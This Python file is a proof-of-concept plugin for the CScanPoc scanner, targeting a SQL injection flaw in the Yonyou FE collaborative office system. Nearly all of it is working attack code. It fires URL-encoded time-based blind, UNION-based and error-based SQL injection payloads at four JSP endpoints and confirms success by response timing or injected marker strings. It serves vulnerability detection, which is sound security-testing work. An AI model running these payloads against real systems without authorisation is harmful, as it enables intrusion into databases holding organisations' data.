# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0031'  # 平台漏洞编号，留空
    name = '用友FE协作办公系统 DBA权限注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-08'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友FE协作办公系统 DBA权限注入。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0112747'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '08e71874-23ea-43c1-b3ed-9c2ccaf2a526'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-0112747
            hh = hackhttp.hackhttp()
            payloads = [
                '/fenc/syncsubject.jsp?pk_corp=1%27%20AND%201%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2871%29%7C%7CCHR%28103%29%7C%7CCHR%2873%29%7C%7CCHR%2867%29%2C5%29%20AND%20%271%27%3D%271',
                '/fenc/syncsubject.jsp?pk_corp=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
            ]
            for payload1 in payloads:
                payload2 = payload1.replace('5', '1')
                url1 = self.target + payload1
                url2 = self.target + payload2
                t1 = time.time()
                code, head, res, errcode, _ = hh.http(url1)
                t2 = time.time()
                code, head, res, errcode, _ = hh.http(url2)
                t3 = time.time()
                if (code == 200 or code == 500) and 2*t2-(t3+t1) > 3:
                    #security_hole(self.target + 'fenc/syncsubject.jsp?pk_corp=1' + "   :time-based blind")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;urls={urls}'.format(
                        target=self.target, name=self.vuln.name, urls=payloads))

            payloads = [
                '/indexsearch/filter.jsp?tableId=1%20UNION%20ALL%20SELECT%20NULL%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28111%29%7C%7CCHR%28105%29%7C%7CCHR%2868%29%7C%7CCHR%28114%29%7C%7CCHR%2875%29%7C%7CCHR%28109%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%2867%29%7C%7CCHR%28102%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--',
                '/indexsearch/filter.jsp?tableId=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2bCHAR%28122%29%2bCHAR%28118%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28108%29%2bCHAR%28107%29%2bCHAR%2878%29%2bCHAR%2867%29%2bCHAR%2876%29%2bCHAR%2868%29%2bCHAR%28103%29%2bCHAR%28118%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%28113%29%2bCHAR%28122%29%2bCHAR%28118%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--'
            ]
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, _ = hh.http(url)
                if (code == 200 or code == 500)and ('qzvzqplkNCLDgvzqqzvq' in res or 'qqvvqoiDrKmjbCfqqvpq' in res):
                    #security_hole(self.target +'indexsearch/filter.jsp?tableId=1' + "   :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;urls={urls}'.format(
                        target=self.target, name=self.vuln.name, urls=payloads))

            payloads = [
                '/feReport/chartList.jsp?delId=1&reportId=1%20AND%201651%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28118%29%2bCHAR%28113%29%2b%28SELECT%20%28CASE%20WHEN%20%281651%3D1651%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2bCHAR%28113%29%2bCHAR%28106%29%2bCHAR%2898%29%2bCHAR%28112%29%2bCHAR%28113%29%29%29',
                '/feReport/chartList.jsp?delId=1&reportId=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28117%29%7C%7CCHR%2882%29%7C%7CCHR%2871%29%7C%7CCHR%28117%29%7C%7CCHR%2899%29%7C%7CCHR%2867%29%7C%7CCHR%2881%29%7C%7CCHR%2875%29%7C%7CCHR%2881%29%7C%7CCHR%28100%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--'

            ]
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, _ = hh.http(url)
                if (code == 200 or code == 500) and ('qqpvq1qjbpq' in res or 'qkvqquRGucCQKQdqzkjq' in res):
                    #security_hole(self.target + 'feReport/chartList.jsp?delId=1&reportId=1' + "   :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;urls={urls}'.format(
                        target=self.target, name=self.vuln.name, urls=payloads))

            payloads = [
                '/flex/newsmessage.jsp?uname=1%27%20AND%209694%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%28114%29%7C%7CCHR%28112%29%7C%7CCHR%28102%29%2C5%29%20AND%20%27nxYr%27%3D%27nxYr',
                '/flex/newsmessage.jsp?uname=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
            ]
            for payload1 in payloads:
                payload2 = payload1.replace('5', '1')
                url1 = self.target + payload1
                url2 = self.target + payload2
                t1 = time.time()
                code, head, res, errcode, _ = hh.http(url1)
                t2 = time.time()
                code, head, res, errcode, _ = hh.http(url2)
                t3 = time.time()
                if (code == 200 or code == 500) and 2*t2-(t3+t1) > 3:
                    #security_hole(self.target + 'flex/newsmessage.jsp?uname=1' + "   :time-based blind")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;urls={urls}'.format(
                        target=self.target, name=self.vuln.name, urls=payloads))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
